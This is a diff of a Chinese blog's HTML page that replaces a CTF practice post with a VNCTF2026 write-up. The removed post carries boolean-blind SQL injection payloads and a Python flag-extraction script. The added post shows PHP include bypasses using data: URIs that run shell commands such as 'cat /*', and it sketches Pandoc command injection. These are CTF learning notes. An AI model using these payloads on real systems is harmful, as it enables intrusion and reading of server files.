@@ -19,23 +19,24 @@
   <meta name="author" content="suny">
   <meta name="keywords" content="">
   
-    <meta name="description" content="error_sql本来看了描述还以为是报错注入结果进去才发现只回显是否查询成功，典型的布尔盲注 吸取上次的教训先测一下WAF，好吧没有 11&#x27; and length(database())&#x3D;10 and &#x27;1&#x27;&#x3D;&#x27;1  确定数据库名长度 11&#x27; and substr(database(),1,1)&#x3D;&#x27;t&#x27; and &#x27;1">
+    <meta name="description" content="还是太菜了，就会做签到 signin12345678910111213141516&lt;?phphighlight_file(__FILE__);$blacklist &#x3D; [&#x27;&#x2F;&#x27;, &#x27;convert&#x27;, &#x27;base&#x27;, &#x27;text&#x27;, &#x27;plain&#x27;];$file &#x3D; $_GET[&#x27;f">
 <meta property="og:type" content="article">
-<meta property="og:title" content="刷题日记">
-<meta property="og:url" content="https://www.sunynov.top/2026/01/04/%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0/index.html">
+<meta property="og:title" content="VNCTF2026">
+<meta property="og:url" content="https://www.sunynov.top/2026/01/31/VNCTF2026/index.html">
 <meta property="og:site_name" content="suny">
-<meta property="og:description" content="error_sql本来看了描述还以为是报错注入结果进去才发现只回显是否查询成功，典型的布尔盲注 吸取上次的教训先测一下WAF，好吧没有 11&#x27; and length(database())&#x3D;10 and &#x27;1&#x27;&#x3D;&#x27;1  确定数据库名长度 11&#x27; and substr(database(),1,1)&#x3D;&#x27;t&#x27; and &#x27;1">
+<meta property="og:description" content="还是太菜了，就会做签到 signin12345678910111213141516&lt;?phphighlight_file(__FILE__);$blacklist &#x3D; [&#x27;&#x2F;&#x27;, &#x27;convert&#x27;, &#x27;base&#x27;, &#x27;text&#x27;, &#x27;plain&#x27;];$file &#x3D; $_GET[&#x27;f">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://pic1.imgdb.cn/item/696107f314866864fecd3f44.png">
-<meta property="article:published_time" content="2026-01-04T08:43:03.000Z">
-<meta property="article:modified_time" content="2026-01-25T09:00:49.884Z">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/697db9809eb0d34db62ff22a.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/697ecc559eb0d34db63433e5.png">
+<meta property="article:published_time" content="2026-01-31T06:02:35.000Z">
+<meta property="article:modified_time" content="2026-02-01T03:47:30.861Z">
 <meta property="article:author" content="suny">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://pic1.imgdb.cn/item/696107f314866864fecd3f44.png">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/697db9809eb0d34db62ff22a.png">
   
   
   
-  <title>刷题日记 - suny</title>
+  <title>VNCTF2026 - suny</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -224,7 +225,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="刷题日记"></span>
+            <span id="subtitle" data-typed-text="VNCTF2026"></span>
           
         </div>
 
@@ -240,8 +241,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2026-01-04 16:43" pubdate>
-          2026年1月4日 下午
+        <time datetime="2026-01-31 14:02" pubdate>
+          2026年1月31日 下午
         </time>
       </span>
     
@@ -252,7 +253,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          337 字
+          319 字
         
       </span>
     
@@ -300,12 +301,12 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">刷题日记</h1>
+            <h1 id="seo-header">VNCTF2026</h1>
             
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2026年1月25日 下午
+                    本文最后更新于 2026年2月1日 中午
                   
                 
               </p>
@@ -313,30 +314,28 @@
             
               <div class="markdown-body">
                 
-                <h2 id="error-sql"><a href="#error-sql" class="headerlink" title="error_sql"></a>error_sql</h2><p>本来看了描述还以为是报错注入结果进去才发现只回显是否查询成功，典型的布尔盲注</p>
-<p>吸取上次的教训先测一下WAF，好吧没有</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; and length(database())=<span class="hljs-number">10</span> and &#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+                <p>还是太菜了，就会做签到</p>
+<h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;convert&#x27;</span>, <span class="hljs-string">&#x27;base&#x27;</span>, <span class="hljs-string">&#x27;text&#x27;</span>, <span class="hljs-string">&#x27;plain&#x27;</span>];<br><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$banned</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$banned</span>) !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;这个是不允许的哦~&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>) &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$file</span>) &lt;= <span class="hljs-number">20</span>)&#123;<br>    <span class="hljs-keyword">include</span> <span class="hljs-variable">$file</span>;<br>&#125;;<br></code></pre></td></tr></table></figure>
 
-<p>确定数据库名长度</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; and substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=&#x27;t&#x27; and &#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+<p>  strpos大小写敏感，所以后面的关键字可以大小写绕过，但是过滤了&#x2F;就比较难受了</p>
+<p><code>data://</code> 协议可以不用&#x2F;&#x2F;</p>
+<p>使用 &lt;?&#x3D; 来代替 &lt;?php  以节省空间</p>
+<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso">？file=<span class="hljs-built_in">data</span>:,<span class="hljs-meta">&lt;?=</span><span class="hljs-string">`env`</span>;<br></code></pre></td></tr></table></figure>
 
-<p>爆数据库名 terra_data</p>
-<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">substr</span>(<span class="hljs-params">(<span class="hljs-keyword">select</span> group_concat(table_name</span>) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema</span>=database()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;a&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span><br></code></pre></td></tr></table></figure>
+<p>现在可以执行命令了，但是还是访问不了根目录，尝试GET传参</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">/?<span class="hljs-attribute">file</span>=data:,&lt;?=`$_GET[1]`;&amp;<span class="hljs-attribute">1</span>=cat /*<br></code></pre></td></tr></table></figure>
 
-<p>爆表名 secret</p>
-<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">substr</span>(<span class="hljs-params">(<span class="hljs-keyword">select</span> group_concat(column_name</span>) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema</span>=database() <span class="hljs-keyword">and</span> table_name=<span class="hljs-string">&#x27;secret&#x27;</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;i&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://pic1.imgdb.cn/item/697db9809eb0d34db62ff22a.png" srcset="/img/loading.gif" lazyload></p>
+<p>当然也可以二次url编码 &#x2F;</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">/<span class="hljs-string">?f</span>ile=<span class="hljs-symbol">data:</span>,&lt;<span class="hljs-string">?=</span><span class="hljs-string">`nl %252f*`</span><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p>爆字段名 flag</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://124.221.168.69:20328/search&#x27;</span><br>str_range = <span class="hljs-string">&#x27;&#125;&#123;-abcdefghijklmnopqrstuvwxyz0123456789&#x27;</span><br>headers = &#123;<span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXIiOiJzdW4ifQ.aWM0dw.jbcwlk8_tGVJkxk2aIVqJXRFhVc&quot;</span>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getData</span>(<span class="hljs-params">str_list</span>):<br>    j = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> str_list:<br>            new_url = url + <span class="hljs-string">f&quot;?id=1&#x27; and substr((select group_concat(flag) from secret),<span class="hljs-subst">&#123;j&#125;</span>,1)=&#x27;<span class="hljs-subst">&#123;i&#125;</span>&#x27; and &#x27;1&#x27;=&#x27;1&quot;</span><br>            r = requests.get(new_url,headers=headers)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;成功查询&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>                <span class="hljs-built_in">print</span>(i, end=<span class="hljs-string">&quot;&quot;</span>)<br>                <span class="hljs-keyword">if</span> i == <span class="hljs-string">&quot;&#125;&quot;</span>:<br>                    <span class="hljs-built_in">print</span>()<br>                    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>                <span class="hljs-keyword">break</span><br>        j = j + <span class="hljs-number">1</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    getData(str_range)<br></code></pre></td></tr></table></figure>
+<h2 id="Markdown2World"><a href="#Markdown2World" class="headerlink" title="Markdown2World"></a>Markdown2World</h2><p>不会做，但是可以简单写下思路</p>
+<p><img src="https://pic1.imgdb.cn/item/697ecc559eb0d34db63433e5.png" srcset="/img/loading.gif" lazyload></p>
+<p>一个基于Pandoc的文档转换器</p>
+<p>前端将上传的文件和格式参数传给<code>convert.php</code>，后端<strong>会调用 Pandoc 命令</strong>完成转换，格式大概是：</p>
+<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">pandoc -s 上传的文件路径 -f 源格式 -<span class="hljs-built_in">t</span> 目标格式 -o 输出文件路径<br></code></pre></td></tr></table></figure>
 
-<p>脚本爆flag</p>
-<h2 id="LFI-2"><a href="#LFI-2" class="headerlink" title="LFI_2_?"></a>LFI_2_?</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-comment">//read file only :)</span><br><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-variable">$content</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br><br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$content</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-
-<p>描述：allow_url_include Off</p>
-<p>这里我们复习一下</p>
-<p>对include而言，它会包含并运行指定文件中的代码，并且php:&#x2F;&#x2F;input和data:&#x2F;&#x2F;依赖allow_url_include On</p>
-<p>而file_get_contents，它只是一个“数据搬运工”，不会解析或执行其中的PHP代码，并且php:&#x2F;&#x2F;input和data:&#x2F;&#x2F;依赖allow_url_fopen On</p>
-<h3 id="日志包含"><a href="#日志包含" class="headerlink" title="日志包含"></a>日志包含</h3><p><img src="https://pic1.imgdb.cn/item/69634f1b75db907620f2687a.png" srcset="/img/loading.gif" lazyload></p>
+<p>而 Pandoc 本身支持<strong>从 URL 读取输入</strong>、<strong>调用外部命令</strong>，再加上如果后端对<strong>上传的文件名</strong>&#x2F;<strong>传递的格式参数</strong>没有做严格过滤，就会造成<strong>命令注入漏洞</strong>。</p>
 
                 
               </div>
@@ -344,27 +343,6 @@
             <hr/>
             <div>
               <div class="post-metas my-3">
-  
-    <div class="post-meta mr-3 d-flex align-items-center">
-      <i class="iconfont icon-category"></i>
-      
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
-    </div>
   
   
 </div>
@@ -375,8 +353,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>刷题日记</div>
-      <div>https://www.sunynov.top/2026/01/04/刷题日记/</div>
+      <div>VNCTF2026</div>
+      <div>https://www.sunynov.top/2026/01/31/VNCTF2026/</div>
     </div>
     <div class="license-meta">
       
@@ -388,7 +366,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2026年1月4日</div>
+          <div>2026年1月31日</div>
         </div>
       
       
@@ -420,9 +398,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2026/01/07/%E6%B5%85%E8%B0%88%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE/" title="浅谈无字母数字RCE">
+                      <a href="/2026/02/01/SSTI%E5%85%A5%E9%97%A8/" title="SSTI入门">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">浅谈无字母数字RCE</span>
+                        <span class="hidden-mobile">SSTI入门</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -430,8 +408,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/12/29/JWT%E8%AF%A6%E8%A7%A3/" title="JWT详解">
-                        <span class="hidden-mobile">JWT详解</span>
+                      <a href="/2026/01/08/CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B/" title="CTFSHOW-2026元旦跨年欢乐赛">
+                        <span class="hidden-mobile">CTFSHOW-2026元旦跨年欢乐赛</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
